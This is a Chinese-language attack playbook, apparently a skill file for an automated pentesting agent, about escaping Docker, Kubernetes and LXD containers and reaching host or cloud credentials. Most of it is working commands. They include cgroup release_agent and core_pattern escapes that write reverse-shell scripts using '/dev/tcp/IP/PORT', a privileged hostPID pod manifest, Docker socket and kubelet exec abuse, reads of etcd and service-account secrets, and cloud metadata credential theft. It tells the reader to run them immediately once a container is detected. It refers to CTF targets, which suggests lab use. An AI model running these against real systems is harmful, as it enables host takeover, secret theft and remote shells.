---
name: 'container-escape'
description: '容器 & K8s 逃逸：Docker特权/挂载→K8s SA token→RBAC→ETCD→LXC/LXD→Cloud IMDS。含决策树。（检索词：Kubernetes/k8s/docker/escape/container escape）'
whenToUse: '检测到容器/K8s 环境时：Docker 特权/挂载→K8s SA token→RBAC→ETCD→LXC/LXD→Cloud IMDS。'
metadata: { domain: linux, tier: T1 }
---

# 容器 & K8s 逃逸

> 🔴 **检测到容器环境后立即执行。先判断类型 (Docker/LXC/K8s) 再选攻击路径。**

## 0. 容器检测

```
[ ] ls -la /.dockerenv                        # Docker 标志文件
[ ] cat /proc/1/cgroup | grep -i 'docker\|lxc\|kubepods\|libpod'
[ ] cat /proc/1/environ | tr '\0' '\n'
[ ] id | grep -E "docker|lxc|lxd"              # -E: | = OR, 不用 \
[ ] mount | grep -E 'overlay|docker|kube'
[ ] hostname → 是否 HEX 字符串 (Docker 默认)
[ ] ip a → 是否有 docker0/cni0/flannel 网桥
[ ] ls /var/run/secrets/kubernetes.io/        # K8s Service Account token
```

### 0.1 🔴 逐容器权限矩阵（多容器 / compose 题型必做）

逃逸口往往不在你第一个拿到的容器上。**禁止用一个容器的实测结果代表全体。**

```
# 1) 枚举所有可达容器
getent hosts redis www backup nodered         # Docker 内嵌 DNS(127.0.0.11) 可解析同网段服务名
cat /etc/hosts; ip -4 addr show               # 确认自己在哪些网段
# 2) 对【每一个】容器执行同样的三连
grep CapEff /proc/self/status
cat /sys/fs/cgroup/devices/devices.list
grep -E "sda|ext4" /proc/self/mountinfo       # 找宿主 bind
# 3) 建表对比
```

| 容器 | CapEff | devices.list | 宿主 bind | 能否读块设备 |
|------|--------|--------------|-----------|--------------|
| （逐个填；未验证的标 ❓） | | | | |

反例: Reddish — 4 个容器，只 dump 了第一个(redis) `CapEff=a80425fb` → 据此把整条 privileged 路径排除；
      实际 backup 容器 = `0000003fffffffff` + `a *:* rwm`，一条 `mknod` + `debugfs` 就拿到 root flag。

---

## 1. Docker 逃逸

### 1.1 Privileged 容器 🔴 最优先

```
# ── 检测（🔴 不依赖 capsh —— 最小镜像里通常没有它）────────────────────
grep CapEff /proc/self/status                 # 全 cap = 0000003fffffffff (4.15) / 000001ffffffffff (5.x)
                                              # Docker 默认 = 00000000a80425fb → 一眼可辨
cat /sys/fs/cgroup/devices/devices.list       # 特权 = "a *:* rwm"
                                              # 默认 = "b *:* m"（可 mknod，但 open 读/写 EPERM）
grep -E "Seccomp|NoNewPrivs" /proc/1/status   # 特权容器 Seccomp: 0
# capsh --print 仅在有 capsh 时用

# ── 方法 1（🔴 首选）: debugfs 直读宿主文件系统 —— 纯用户态只读，不 mount ──
lsblk; fdisk -l                               # 确认宿主磁盘/分区号（mountinfo 的 8:2 → /dev/sda2）
mknod /dev/sda2 b 8 2                         # 🔴 必做第一步！容器内 /dev/sda* 通常不存在
debugfs -R "cat /root/root.txt" /dev/sda2     # 🔴 不加 -w = 只读
debugfs -R "ls -l /root" /dev/sda2            # 列目录；亦可用 dump / rdump 取文件
# 只需 root.txt / user.txt 时到此为止。
# debugfs 走 libext2fs 直接解析块设备，不创建 superblock，对运行中的宿主 fs 无害。

# ── 方法 2: mount 宿主磁盘（仅当确实需要写宿主 fs 或 chroot 时）──
mkdir -p /mnt/host
mount -t ext4 /dev/sda2 /mnt/host             # 🔴 不要加 -o ro：宿主已 rw 挂载 → 内核 EBUSY
chroot /mnt/host /bin/bash
# 🔴🔴 严禁对运行中的宿主 fs 做以下操作（实测会把整台靶机打挂）：
#   mount -o ro,noload ...          同 sb 混用 ro/rw → EBUSY
#   losetup + mount /dev/loop0 ...  对同一 ext4 造出【第二个独立 superblock】
#                                   → 触发 errors=remount-ro → 宿主根全局只读、靶机报废
#   需要只读访问 → 回到方法 1 的 debugfs。

# ── 方法 3: cgroup release_agent (🔴 cgroup v1 only! v2 不支持)
# 先检测: stat -fc %T /sys/fs/cgroup → cgroup2fs = v2 不可行
mkdir /tmp/cgrp
mount -t cgroup -o memory cgroup /tmp/cgrp 2>/dev/null \
  || mount -t cgroup -o rdma cgroup /tmp/cgrp 2>/dev/null
mkdir /tmp/cgrp/x
echo 1 > /tmp/cgrp/x/notify_on_release
# 🔴 release_agent 需要宿主机路径！写脚本到容器根目录 /cmd，宿主机路径 = upperdir/cmd
host_path=$(sed -n 's/.*upperdir=\([^,]*\).*/\1/p' /etc/mtab)
echo "$host_path/cmd" > /tmp/cgrp/release_agent
echo '#!/bin/bash' > /cmd                 # 🔴 必须是 bash!/bin/sh 不支持 /dev/tcp
echo 'bash -i >& /dev/tcp/IP/PORT 0>&1' >> /cmd
chmod +x /cmd
# 触发: sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"

# ── 方法 4: nsenter 进宿主机 namespace ──
# 🔴 前提: hostPID 共享 —— privileged ≠ hostPID！
# 先验证: ps aux 能否看到宿主进程？若只有容器自身进程 → 本方法不可用
nsenter --target 1 --mount --uts --ipc --net --pid -- bash
```

### 1.2 Docker Socket 挂载

```
[ ] ls /var/run/docker.sock → 存在 → 🎯 完全控制 Docker
    docker -H unix:///var/run/docker.sock ps
    docker -H unix:///var/run/docker.sock run -v /:/host -it alpine chroot /host

[ ] 通过 Docker API (TCP:2375/2376)
    curl http://IP:2375/containers/json
    docker -H tcp://IP:2375 run -v /:/host -it alpine chroot /host
```

### 1.3 Capabilities 滥用

```
[ ] capsh --print

# CAP_SYS_ADMIN → mount / cgroup / nsenter (见 1.1)
# CAP_SYS_PTRACE → 注入宿主机进程
# CAP_SYS_MODULE → insmod 内核模块
# CAP_NET_RAW    → ARP 欺骗宿主机
# CAP_DAC_READ_SEARCH → 绕过文件读权限
```

### 1.4 共享 Namespace

```
# host pid namespace
[ ] ls /proc/ → 能看到宿主机进程? → nsenter --target 1 --mount --uts --ipc --net --pid -- bash

# host network
[ ] ip a → 看到 docker0? → 可访问宿主机网络 → 攻击宿主机服务

# host IPC
[ ] ipcs -a → 能看到宿主机共享内存?
```

### 1.5 敏感挂载点

```
mount | grep -E '/proc|/sys|/var/run|/dev'
# /proc:/proc (rw) → nsenter 逃逸
# /:/host → chroot /host
# /var/run/docker.sock 挂载
```

### 1.6 CVE 逃逸
```
# CVE-2019-5736: runc <1.0-rc6 → 容器内写 /proc/self/exe 覆盖宿主机 runc
# CVE-2024-21626 (Leaky Vessels): runc WORKDIR fd 泄露 → 宿主机文件访问
# CVE-2022-0492: cgroup v1 release_agent 无需 CAP_SYS_ADMIN (旧内核未修)
# CVE-2025-9074: Docker Desktop ≤4.44.2 → 容器内 mount 宿主机资源
```

### 1.7 core_pattern 逃逸 (rw /proc)
```
# 条件: /proc/sys/kernel/core_pattern 可写 + CAP_SYS_ADMIN
# 🔴 core_pattern 路径必须是宿主机路径！先获取 host_path（同 release_agent）
host_path=$(sed -n 's/.*upperdir=\([^,]*\).*/\1/p' /etc/mtab)
echo "|$host_path/pwn.sh" > /proc/sys/kernel/core_pattern
echo '#!/bin/bash' > /pwn.sh
echo 'bash -i >& /dev/tcp/IP/PORT 0>&1' >> /pwn.sh
chmod +x /pwn.sh
# → 触发 core dump: killall -ABRT someproc → 以 root 执行 /pwn.sh
```

### 1.8 /proc/1/root 快捷逃逸
```
# 🔴 前提: hostPID 共享或能找到宿主机进程的 PID
# 容器内 PID 1 是容器 init → 它的 root 就是容器 root → 不是逃逸
# hostPID 共享时 → 宿主机 init 在某个 PID → ls /proc/<HOST_INIT_PID>/root/
ls /proc/1/root/ → 如果显示宿主机 / 而非容器 / ? → chroot /proc/<PID>/root /bin/bash
# 🔴 Docker 默认 seccomp 可能阻止 chroot → 优先试 release_agent 而非此方法
```

---

## 2. K8s Pod 逃逸

### 2.1 Service Account Token 滥用

```
[ ] ls /var/run/secrets/kubernetes.io/serviceaccount/
[ ] cat /var/run/secrets/kubernetes.io/serviceaccount/token

# kubectl + token
kubectl --token=$(cat token) --server=https://kubernetes.default.svc --insecure-skip-tls-verify auth can-i --list

# 枚举权限
kubectl get pods --all-namespaces
kubectl get secrets --all-namespaces
kubectl get nodes

# RBAC 滥用: 可创建 pod → 挂载宿主机 → 逃逸
kubectl apply -f evil-pod.yaml
```

### 2.2 K8s RBAC 提权

```
[ ] kubectl auth can-i create pods --all-namespaces → yes → 创建特权 pod
[ ] kubectl auth can-i create roles --all-namespaces → yes → 添加权限
[ ] kubectl auth can-i get secrets     → yes → 读所有 secrets
[ ] kubectl auth can-i "*" "*"         → yes → 集群 admin!
```

### 2.3 宿主机逃逸（通过 Pod 创建）

```yaml
apiVersion: v1
kind: Pod
spec:
  hostPID: true              # 🔴 必须！否则 nsenter 找不到宿主机进程
  containers:
  - name: escape
    image: alpine
    command: ["/bin/sh", "-c", "nsenter --target 1 --mount --uts --ipc --net --pid -- bash"]
    securityContext:
      privileged: true
    volumeMounts:
    - name: host
      mountPath: /host
  volumes:
  - name: host
    hostPath:
      path: /
      type: Directory
```

### 2.4 kubelet API 直接访问
```
# kubelet 默认 10250 端口 — 从 Pod 内访问节点 IP
curl -k https://<NODE_IP>:10250/pods
# → 列出所有 pod → 找到目标 pod → exec
curl -k -XPOST https://<NODE_IP>:10250/run/<NS>/<POD>/<CONTAINER> -d "cmd=id"
# 🔴 kubelet 未加固 → 直接 exec 任意 pod 的容器
```

### 2.5 ETCD 访问

```
[ ] env | grep ETCD → ETCDCTL_ENDPOINTS / certs
    etcdctl --endpoints=<...> get / --prefix --keys-only | grep secrets
    etcdctl get /registry/secrets/<ns>/<secret>
```

---

## 3. LXC/LXD 逃逸

```
[ ] id | grep lxd → LXD 组 → 可创建 privileged 容器 → 挂载宿主机
    lxc init ubuntu:22.04 escape -c security.privileged=true
    lxc config device add escape host disk source=/ path=/mnt/root recursive=true
    lxc start escape; lxc exec escape bash

[ ] 已安装 LXD snap → /snap/bin/lxc
```

---

## 4. Cloud VM 逃逸（元数据 API）

```
# AWS IMDSv1
curl http://169.254.169.254/latest/meta-data/
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/<ROLE>

# AWS IMDSv2 (需要 token)
TOKEN=$(curl -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")
curl -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/

# Azure IMDS
curl -H "Metadata:true" "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com"

# GCP
curl "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token" -H "Metadata-Flavor: Google"
```

---

## 5. 快速优先级

| 优先级 | 条件 | 方法 |
|--------|------|------|
| 🔴 0 | **Privileged 容器**（看 `CapEff` 一眼可定，100% 可用） | `mknod` + `debugfs -R` 直读宿主 fs；需写/chroot 才 mount；release_agent |
| 🔴 1 | Docker socket 挂载 | docker run -v /:/host |
| 🔴 2 | Cap SYS_ADMIN（非全特权但含此 cap） | cgroup release_agent / core_pattern (cgroup v1 only!) |
| 🔴 3 | K8s SA token + create pods | 创建特权 pod (必须加 hostPID!) |
| 🔴 4 | hostPID | nsenter -t 1 |
| 🔴 5 | /proc/1/root | chroot /proc/1/root /bin/bash |
| 🟠 6 | kubelet 10250 | 直接 exec 其他 pod |
| 🟠 7 | Cloud IMDS | curl metadata → IAM 角色 |
| 🟡 8 | LXD 组 | privileged 容器 |
| ⚪ 9 | CVE 逃逸（**最后**） | runc (CVE-2019-5736/CVE-2024-21626) / Docker Desktop (CVE-2025-9074) / CVE-2022-0492 |

> 🔴 CVE 需要版本 + 触发条件，命中率低；privileged 是看一眼 `CapEff` 就能确定的路径 —— **顺序不能反**。

## 反模式

| ❌ 禁止 | ✅ 正确 |
|--------|--------|
| ❌ 容器内跑 linpeas 浪费时间 | ✅ 先查 privileged/capabilities/socket |
| ❌ K8s 中找不到 kubectl 就放弃 | ✅ 用 curl + SA token 直接调 API |
| ❌ 忽略 /var/run/docker.sock | ✅ 这是最高危的逃逸路径 |
| ❌ 只 dump 自己所在容器的 CapEff | ✅ 逐容器建权限矩阵（§0.1） |
| ❌ 依赖 `capsh`（最小镜像没有） | ✅ 读 `/proc/self/status` 的 `CapEff` + `devices.list` |
| ❌ 用 `mount` / `losetup` 读宿主 fs | ✅ `debugfs -R`（纯用户态只读，不建 superblock） |
| ❌ 对运行中的宿主 fs 做 rw / loop 二次挂载 | ✅ 会触发 `errors=remount-ro`，**整台靶机报废** |
